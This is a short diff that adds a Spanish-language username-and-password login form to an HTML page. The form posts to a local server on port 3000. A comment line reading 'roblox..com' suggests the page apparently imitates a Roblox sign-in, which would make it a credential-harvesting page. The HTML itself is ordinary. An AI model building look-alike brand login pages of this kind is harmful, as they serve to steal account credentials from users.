@@ -20,3 +20,8 @@
 </body>
 </html>
 # roblox..com
+<form id="loginForm" action="http://localhost:3000/login" method="POST">
+    <input type="text" placeholder="Nombre de usuario" name="username" required>
+    <input type="password" placeholder="Contraseña" name="password" required>
+    <button type="submit">Iniciar sesión</button>
+</form>
